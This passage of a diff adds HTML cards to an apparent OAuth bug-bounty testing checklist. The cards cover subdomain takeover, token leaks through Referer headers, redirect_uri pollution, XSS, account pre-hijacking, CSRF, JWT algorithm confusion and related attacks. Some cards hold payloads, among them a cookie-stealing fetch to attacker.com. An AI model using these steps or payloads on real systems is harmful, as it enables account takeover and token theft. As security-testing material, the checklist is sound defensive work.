+      <div class="mindset"><p>"The user trusts the destination because they just finished logging in to a legitimate site. The phishing page they land on looks legitimate because it comes from a trusted flow."</p></div>
+    </div>
+  </div>
+
+  <!-- R6 -->
+  <div class="card" style="--card-color:#ff7733">
+    <div class="card-header">
+      <div class="report-num">#06</div>
+      <div>
+        <div class="card-title">Subdomain Takeover → OAuth Redirect</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff7733;border-color:#ff7733;background:rgba(255,119,51,0.08)">SUBDOMAIN TAKEOVER</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ff7733">
+        <div class="scenario-label" style="color:#ff7733">SCENARIO</div>
+        <div class="scenario-text">Subdomain of trusted.com is dangling (DNS points to decommissioned service). Register that service → take over subdomain → use it as OAuth redirect target.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Enumerate subdomains: <code class="orange">subfinder</code>, <code class="orange">amass</code>, <code class="orange">dnsx</code> on target domain</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Check for NXDOMAIN on subdomains with CNAME records — dangling DNS = takeover candidate</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Identify service: Heroku? GitHub Pages? S3? Netlify? → Register that asset under attacker account</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Confirm takeover: visit subdomain → returns attacker-controlled content</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Use taken-over subdomain URL as <code class="orange">redirect_uri</code> in OAuth → OAuth server approves (same parent domain)</div></li>
+        <li><div class="check-box" data-phase="2" onclick="toggleCheck(this)"></div><div class="check-text">Host token-capturing script on taken-over subdomain → send crafted login link to victim</div></li>
+      </ul>
+      <div class="mindset"><p>"Subdomain takeover alone is Medium severity. Subdomain takeover + OAuth redirect = Critical ATO. Always check if the target uses OAuth when you find a takeover."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards phase2 -->
+
+
+<!-- ══════════════════════════════════════════════════
+     PHASE 3: REFERER HEADER LEAKAGE
+══════════════════════════════════════════════════ -->
+<div class="phase-header" id="phase3" style="--phase-color:#ff7733">
+  <div class="phase-badge" style="background:#ff7733">PHASE 03</div>
+  <div class="phase-title">REFERER LEAKAGE — Token Leaks Without URL Manipulation</div>
+  <div class="phase-goal">Reports #7, #8 · Token in URL leaks via browser Referer header</div>
+</div>
+<div class="cards-grid">
+
+  <!-- R7 -->
+  <div class="card" style="--card-color:#ff7733">
+    <div class="card-header">
+      <div class="report-num">#07</div>
+      <div>
+        <div class="card-title">Authorization Code Leak via Referer Header (Reports #7, #8)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ff7733;border-color:#ff7733;background:rgba(255,119,51,0.08)">REFERER LEAK</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ff7733">
+        <div class="scenario-label" style="color:#ff7733">SCENARIO</div>
+        <div class="scenario-text">After OAuth redirect, the code/token is in the URL. If the callback page loads any external resource or has an outbound link, the browser sends the full URL (with code) as the Referer header to those external servers.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Complete OAuth flow → land on callback page → check URL for <code class="orange">?code=</code> or <code class="orange">#access_token=</code></div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check page source for ANY external resources: 3rd-party JS, CSS, images, analytics, fonts</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">In Burp, check all outgoing requests from callback page — look for Referer header containing the code</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check for outbound links: Social icons, Help button, Privacy policy → click each and inspect Referer</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check if Referrer-Policy header is set: <code class="orange">no-referrer-when-downgrade</code> = still leaks to HTTPS sites</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">For access_token in URL (#fragment): fragment doesn't leak via Referer but leaks if page does <code class="orange">document.location</code> logging</div></li>
+      </ul>
+      <div class="mindset"><p>"The callback page is the most dangerous page in the OAuth flow. Every pixel loaded from an external server, every analytics beacon — each one is a potential token thief."</p></div>
+      <div class="pro-tip"><p>Check: does the page use Google Analytics, Facebook Pixel, Mixpanel? These analytics scripts fire on every page load and send the full URL (including code) to their servers. That's a reportable information disclosure.</p></div>
+    </div>
+  </div>
+
+  <!-- R8 -->
+  <div class="card" style="--card-color:#ff7733">
+    <div class="card-header">
+      <div class="report-num">#08</div>
+      <div>
+        <div class="card-title">Access Token in URL Fragment — JS Log Leak</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ff7733;border-color:#ff7733;background:rgba(255,119,51,0.08)">FRAGMENT LEAK</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ff7733">
+        <div class="scenario-label" style="color:#ff7733">SCENARIO</div>
+        <div class="scenario-text">Implicit flow sends access_token in URL fragment (#). While fragment doesn't go to server, frontend JS may log or send it to error tracking services (Sentry, LogRocket, etc.).</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check if OAuth uses implicit flow: response_type=token → token appears as <code class="orange">#access_token=XYZ</code></div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Monitor ALL JS network requests from callback page — look for error reporting tools (Sentry, Bugsnag)</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check for: <code class="orange">window.location.href</code> or <code class="orange">document.referrer</code> passed to analytics</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check browser history — does the token appear in browser history? (History API leak)</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check server access logs via Burp — does any backend endpoint receive the fragment value?</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Report: app should use <code>response_type=code</code> (authorization code) instead of implicit flow</div></li>
+      </ul>
+      <div class="mindset"><p>"Fragment identifiers were designed to stay client-side. But when developers paste window.location.hash into a Sentry error report, the token goes to Sentry's servers."</p></div>
+    </div>
+  </div>
+
+  <!-- R9 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#09</div>
+      <div>
+        <div class="card-title">Token Leak via Browser History & Logs</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-medium">MEDIUM</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">TOKEN EXPOSURE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ff3355">
+        <div class="scenario-label" style="color:#ff3355">SCENARIO</div>
+        <div class="scenario-text">Authorization code or access_token persists in URL after use — remains in browser history, server logs, and proxy logs exposing it to anyone with access.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Complete OAuth flow → immediately check browser URL bar — is token still visible?</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check: does app use <code class="red">history.replaceState()</code> to clean token from URL after reading it? If NOT → vuln</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Open browser history → is the full URL with code still there?</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Check server access logs (if you have access): does the token appear in GET request URL?</div></li>
+        <li><div class="check-box" data-phase="3" onclick="toggleCheck(this)"></div><div class="check-text">Document: code not invalidated + persists in URL = dual exposure (history + server logs)</div></li>
+      </ul>
+      <div class="mindset"><p>"Once the code is used, it should vanish from the URL. If the app doesn't call history.replaceState(), the token sits in browser history like a spare key under the doormat."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards phase3 -->
+
+
+<!-- ══════════════════════════════════════════════════
+     PHASE 4: PARAMETER POLLUTION & XSS COMBO
+══════════════════════════════════════════════════ -->
+<div class="phase-header" id="phase4" style="--phase-color:#aa55ff">
+  <div class="phase-badge" style="background:#aa55ff">PHASE 04</div>
+  <div class="phase-title">PARAMETER POLLUTION & XSS — Protocol Confusion Attacks</div>
+  <div class="phase-goal">Reports #9–#12 · HPP · XSS in redirect · Wildcard exploitation</div>
+</div>
+<div class="cards-grid">
+
+  <!-- R10 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#10</div>
+      <div>
+        <div class="card-title">HTTP Parameter Pollution on redirect_uri (Report #9)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">HPP · PARAM POLLUTION</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#aa55ff">
+        <div class="scenario-label" style="color:#aa55ff">SCENARIO</div>
+        <div class="scenario-text">Send multiple redirect_uri parameters. Different backend components may use different ones — OAuth validator reads first (trusted), redirect logic uses last (attacker).</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">In OAuth authorization request: add double redirect_uri: <code class="purple">redirect_uri=https://trusted.com/cb&redirect_uri=https://attacker.com</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Try reversed order: <code class="purple">redirect_uri=https://attacker.com&redirect_uri=https://trusted.com/cb</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Try array notation: <code class="purple">redirect_uri[]=https://trusted.com&redirect_uri[]=https://attacker.com</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Try comma-separated: <code class="purple">redirect_uri=https://trusted.com,https://attacker.com</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Observe: which URL receives the authorization code? First? Last? Both?</div></li>
+      </ul>
+      <div class="mindset"><p>"The OAuth validator and the redirect handler are two different code paths. HPP exploits the gap between what they each read — one sees the safe value, the other sees mine."</p></div>
+    </div>
+  </div>
+
+  <!-- R11 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#11</div>
+      <div>
+        <div class="card-title">XSS via redirect_uri Reflection (Report #10)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">XSS · TOKEN THEFT</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ff3355">
+        <div class="scenario-label" style="color:#ff3355">SCENARIO</div>
+        <div class="scenario-text">The redirect_uri value is reflected in the error page or the OAuth consent screen source code without sanitization — inject XSS payload to steal tokens via script execution.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Submit invalid redirect_uri → observe error page → does the URI value appear in page source?</div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Try basic XSS: <code class="red">redirect_uri=javascript:alert(document.domain)</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Try reflected in href context: <code class="red">redirect_uri=https://x.com">&lt;script&gt;alert(1)&lt;/script&gt;</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Try javascript: URI in consent screen link: <code class="red">redirect_uri=javascript:fetch('https://attacker.com?c='+document.cookie)</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">If XSS fires: extract <code>document.location</code> (code in URL), cookies, localStorage tokens</div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Chain: XSS on OAuth consent page = highest-trust page in the flow = Critical impact</div></li>
+      </ul>
+      <div class="mindset"><p>"XSS on an OAuth consent page is the most dangerous XSS in an application. The user has JUST authenticated — their session is fresh and their tokens are right there in memory."</p></div>
+    </div>
+  </div>
+
+  <!-- R12 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#12</div>
+      <div>
+        <div class="card-title">scope Manipulation & Privilege Escalation (Report #11)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">SCOPE ESCALATION</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#aa55ff">
+        <div class="scenario-label" style="color:#aa55ff">SCENARIO</div>
+        <div class="scenario-text">The scope parameter controls what access the token grants. Server doesn't validate scope properly — add admin/elevated scopes to get a token with more permissions than intended.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Capture OAuth request → find <code class="purple">scope=read</code> or <code class="purple">scope=profile email</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Escalate: add admin scopes: <code class="purple">scope=read write admin</code>, <code class="purple">scope=openid admin:org</code></div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Try: <code class="purple">scope=*</code> or <code class="purple">scope=all</code> (wildcard scope request)</div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">If server doesn't show error → check issued token's introspection endpoint for granted scopes</div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Use elevated-scope token to call admin API endpoints → privilege escalation confirmed</div></li>
+        <li><div class="check-box" data-phase="4" onclick="toggleCheck(this)"></div><div class="check-text">Also test: offline_access scope without user consent → persistent token refresh without user knowing</div></li>
+      </ul>
+      <div class="mindset"><p>"The scope parameter is a shopping list. If the cashier (OAuth server) doesn't check what you put in the cart, you walk out with admin access you never paid for."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards phase4 -->
+
+
+<!-- ══════════════════════════════════════════════════
+     PHASE 5: LOGIC & REGISTRATION BUGS
+══════════════════════════════════════════════════ -->
+<div class="phase-header" id="phase5" style="--phase-color:#ff3355">
+  <div class="phase-badge" style="background:#ff3355">PHASE 05</div>
+  <div class="phase-title">LOGIC & REGISTRATION BUGS — Break the OAuth Flow Logic</div>
+  <div class="phase-goal">Reports #13–#24 · Pre-hijack · Account merge · CSRF · Code reuse</div>
+</div>
+<div class="cards-grid">
+
+  <!-- R13 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#13</div>
+      <div>
+        <div class="card-title">OAuth Account Pre-Hijacking (Report #13)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">PRE-HIJACK</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ff3355">
+        <div class="scenario-label" style="color:#ff3355">SCENARIO</div>
+        <div class="scenario-text">Attacker registers with victim's email using password-based auth. When victim later signs up via Google/GitHub (same email), accounts merge — attacker retains access.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Register account using victim's email + attacker's password (before victim signs up)</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Do NOT verify the email → leave account in "unverified" state</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">When victim signs up via "Login with Google" using same email → test if accounts auto-merge</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">After victim registers via Google: try logging in with attacker's original password</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">If login works → attacker retains access to victim's account = Critical pre-hijack ATO</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Also test: CSRF variant — force victim to merge their OAuth account with attacker's existing account</div></li>
+      </ul>
+      <div class="mindset"><p>"The race condition in identity is: who claims the email first? If I claim it with my password before you claim it with Google, we share the account — but only I know the password."</p></div>
+    </div>
+  </div>
+
+  <!-- R14 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#14</div>
+      <div>
+        <div class="card-title">CSRF on OAuth Authorization — State Parameter Missing</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">CSRF · NO STATE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ff3355">
+        <div class="scenario-label" style="color:#ff3355">SCENARIO</div>
+        <div class="scenario-text">OAuth flow missing state parameter (or using predictable/missing CSRF validation). Attacker can force victim's browser to link their OAuth account to attacker's application account.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Check OAuth authorization request: is <code class="red">state=</code> parameter present?</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Check: is state validated server-side? Remove/modify state and see if flow still completes</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">CSRF attack: Start attacker's own OAuth flow → capture callback URL with code → stop before completion</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Force victim to visit the captured callback URL → victim's browser completes attacker's OAuth flow</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Result: victim's Google/GitHub account linked to attacker's app account → attacker logs in as victim</div></li>
+      </ul>
+      <div class="mindset"><p>"The state parameter is the OAuth flow's CSRF token. Without it, I can hijack the callback — the user clicks 'Allow' but the code ends up in my account."</p></div>
+    </div>
+  </div>
+
+  <!-- R15 -->
+  <div class="card" style="--card-color:#00cfff">
+    <div class="card-header">
+      <div class="report-num">#15</div>
+      <div>
+        <div class="card-title">Authorization Code Reuse (No Single-Use Enforcement)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#00cfff;border-color:#00cfff;background:rgba(0,207,255,0.08)">CODE REUSE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row">
+        <div class="scenario-label">SCENARIO</div>
+        <div class="scenario-text">Authorization code should be single-use and short-lived. If not invalidated after first exchange, attacker who intercepts code can use it again (replay attack).</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Complete OAuth flow → capture authorization code at callback URL</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Exchange code for token once → note the access_token received</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Send the SAME code to token endpoint again → does it return another token?</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Try after 5 minutes, 1 hour — what is the actual code expiry?</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Test race condition: send 10 simultaneous requests with same code → does any return a token?</div></li>
+      </ul>
+      <div class="mindset"><p>"An authorization code is a one-time password for a vault. If the bank lets you use the same OTP twice, the vault is always open to whoever intercepts it once."</p></div>
+    </div>
+  </div>
+
+  <!-- R16 -->
+  <div class="card" style="--card-color:#ffc233">
+    <div class="card-header">
+      <div class="report-num">#16</div>
+      <div>
+        <div class="card-title">client_secret Exposed in Client-Side Code</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08)">SECRET EXPOSURE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#ffc233">
+        <div class="scenario-label" style="color:#ffc233">SCENARIO</div>
+        <div class="scenario-text">client_secret is hardcoded in JavaScript, mobile app, or public repository — allows anyone to impersonate the application and exchange codes or refresh tokens.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Search all JS files: <code class="yellow">client_secret</code>, <code class="yellow">clientSecret</code>, <code class="yellow">CLIENT_SECRET</code>, <code class="yellow">oauth_secret</code></div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Search GitHub repos: <code class="yellow">org:target client_secret</code>, <code class="yellow">filename:.env client_secret</code></div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Check mobile app: decompile APK/IPA → search strings for secret values</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Intercept token exchange request → find client_secret in POST body or Basic Auth header</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">With client_secret: impersonate the app → exchange any intercepted code for a real token</div></li>
+      </ul>
+      <div class="mindset"><p>"The client_secret is supposed to prove the app's identity. When it's in the JavaScript bundle, every user of the site has it. The 'secret' is now a public fact."</p></div>
+    </div>
+  </div>
+
+  <!-- R17 -->
+  <div class="card" style="--card-color:#00ff88">
+    <div class="card-header">
+      <div class="report-num">#17</div>
+      <div>
+        <div class="card-title">OAuth Consent Screen Bypass (Force Approve)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,0.08)">CONSENT BYPASS</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#00ff88">
+        <div class="scenario-label" style="color:#00ff88">SCENARIO</div>
+        <div class="scenario-text">OAuth consent screen can be bypassed or auto-approved using prompt=none, previously granted consent, or response_mode manipulation — user never sees what they're approving.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Add <code class="green">prompt=none</code> to OAuth request → does server skip consent screen and auto-approve?</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Add <code class="green">prompt=consent</code> but with extra scope → re-approval shown but scopes pre-checked?</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Try <code class="green">response_mode=fragment</code> vs <code class="green">response_mode=query</code> → different token handling</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Send OAuth link to victim → does it auto-approve if victim previously consented (even to different scope)?</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Check: can you add new scopes to an already-approved app without re-consent? → silent scope escalation</div></li>
+      </ul>
+      <div class="mindset"><p>"'prompt=none' was designed for seamless SSO. When a server auto-approves it for any app (not just first-party), consent becomes meaningless and any scope request gets silently granted."</p></div>
+    </div>
+  </div>
+
+  <!-- R18 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#18</div>
+      <div>
+        <div class="card-title">Token Fixation — Predictable State Attack</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">TOKEN FIXATION</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#aa55ff">
+        <div class="scenario-label" style="color:#aa55ff">SCENARIO</div>
+        <div class="scenario-text">State parameter is predictable (timestamp, sequential number, or weak random). Attacker predicts the state, waits for victim to complete OAuth, then uses predicted state to hijack the callback.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Collect 10 state parameter samples from rapid OAuth initiations → analyze entropy</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Decode state: base64? MD5 of timestamp? Sequential numbers? UUID v1 (time-based)?</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">If timestamp-based: predict next state value for a given time window</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Test: can you reuse an old state value in a new OAuth flow? → state not bound to session</div></li>
+        <li><div class="check-box" data-phase="5" onclick="toggleCheck(this)"></div><div class="check-text">Fixation: inject your known state into victim's OAuth URL → when their flow completes with your state → you get their code</div></li>
+      </ul>
+      <div class="mindset"><p>"State is meant to be a random nonce binding the request to the user's session. A predictable state is a predictable lock — I just need to know what time the victim started the flow."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards phase5 -->
+
+
+<!-- ══════════════════════════════════════════════════
+     PHASE 6: TOKEN ATTACKS & STATE MANIPULATION
+══════════════════════════════════════════════════ -->
+<div class="phase-header" id="phase6" style="--phase-color:#00ff88">
+  <div class="phase-badge" style="background:#00ff88">PHASE 06</div>
+  <div class="phase-title">TOKEN ATTACKS & STATE MANIPULATION — Final Layer</div>
+  <div class="phase-goal">JWT none·alg · Token mixing · Refresh abuse · PKCE bypass · SSO abuse</div>
+</div>
+<div class="cards-grid">
+
+  <!-- R19 -->
+  <div class="card" style="--card-color:#00ff88">
+    <div class="card-header">
+      <div class="report-num">#19</div>
+      <div>
+        <div class="card-title">JWT Algorithm Confusion (none / RS256→HS256)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,0.08)">JWT ATTACK · CRITICAL</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#00ff88">
+        <div class="scenario-label" style="color:#00ff88">SCENARIO</div>
+        <div class="scenario-text">Server accepts JWT tokens with 'none' algorithm or confuses RS256 public key as HS256 HMAC secret — attacker forges any token with arbitrary claims.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Obtain a valid JWT token → decode at jwt.io → identify algorithm: RS256, HS256, ES256</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Test "none" algorithm: change header to <code class="green">{"alg":"none"}</code> → remove signature → send token</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Test "None" (capitalized), "NONE", "nOnE" — different case variants bypass some validators</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">RS256→HS256 confusion: get public key from <code class="green">/.well-known/jwks.json</code> → use as HMAC secret with HS256</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Forge token: change <code class="green">sub</code> (user ID) to victim's ID, escalate <code class="green">role</code> claim to "admin"</div></li>
+        <li><div class="check-box" data-phase="6" onclick="toggleCheck(this)"></div><div class="check-text">Use <code class="green">jwt_tool</code> or <code class="green">python-jwt</code> to automate all algorithm confusion attacks</div></li>
+      </ul>
+      <div class="mindset"><p>"The algorithm field in a JWT header is trusted by naive libraries. If I can change RS256 to HS256, the server suddenly uses the PUBLIC key to verify — a key I already have."</p></div>
+    </div>
+  </div>
+
+  <!-- R20 -->
+  <div class="card" style="--card-color:#00ff88">
+    <div class="card-header">
+      <div class="report-num">#20</div>
+      <div>
+        <div class="card-title">Refresh Token Abuse — Infinite Session Persistence</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,0.08)">REFRESH TOKEN</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="scenario-row" style="border-left-color:#00ff88">
+        <div class="scenario-label" style="color:#00ff88">SCENARIO</div>
